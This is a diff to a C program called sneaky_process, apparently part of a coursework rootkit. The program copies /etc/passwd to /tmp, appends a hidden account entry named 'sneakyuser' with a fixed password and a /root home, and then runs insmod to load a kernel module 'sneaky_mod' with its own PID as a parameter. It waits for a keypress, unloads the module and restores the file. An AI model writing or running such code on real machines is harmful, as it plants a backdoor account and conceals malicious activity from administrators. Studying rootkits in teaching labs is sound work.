@@ -3,10 +3,14 @@
 #include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
 #define PASSWD_PATH "/etc/passwd"
 #define BACKUP_PATH "/tmp/passwd"
 #define SNEAKY_ENTRY "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n"
+#define MODULE_NAME "sneaky_mod"
+#define MODULE_PATH "./sneaky_mod.ko"
 
 static void die(const char *message)
 {
@@ -92,18 +96,60 @@ static void append_sneaky_entry(void)
   }
 }
 
+static int run_command(const char *path, char *const argv[])
+{
+  int status;
+  pid_t pid = fork();
+
+  if (pid < 0) {
+    die("fork");
+  }
+
+  if (pid == 0) {
+    execvp(path, argv);
+    perror("execvp");
+    _exit(EXIT_FAILURE);
+  }
+
+  if (waitpid(pid, &status, 0) < 0) {
+    die("waitpid");
+  }
+
+  if (!WIFEXITED(status)) {
+    return -1;
+  }
+
+  return WEXITSTATUS(status);
+}
+
 int main(void)
 {
   int ch;
+  char pid_arg[64];
+  char *insmod_argv[] = {"insmod", MODULE_PATH, pid_arg, NULL};
+  char *rmmod_argv[] = {"rmmod", MODULE_NAME, NULL};
 
   printf("sneaky_process pid = %d\n", getpid());
   copy_file(PASSWD_PATH, BACKUP_PATH);
   append_sneaky_entry();
 
+  snprintf(pid_arg, sizeof(pid_arg), "sneaky_pid=%d", getpid());
+  if (run_command("insmod", insmod_argv) != 0) {
+    copy_file(BACKUP_PATH, PASSWD_PATH);
+    fprintf(stderr, "failed to load sneaky_mod.ko\n");
+    return EXIT_FAILURE;
+  }
+
   while ((ch = getchar()) != EOF) {
     if (ch == 'q') {
       break;
     }
+  }
+
+  if (run_command("rmmod", rmmod_argv) != 0) {
+    copy_file(BACKUP_PATH, PASSWD_PATH);
+    fprintf(stderr, "failed to unload sneaky_mod\n");
+    return EXIT_FAILURE;
   }
 
   copy_file(BACKUP_PATH, PASSWD_PATH);
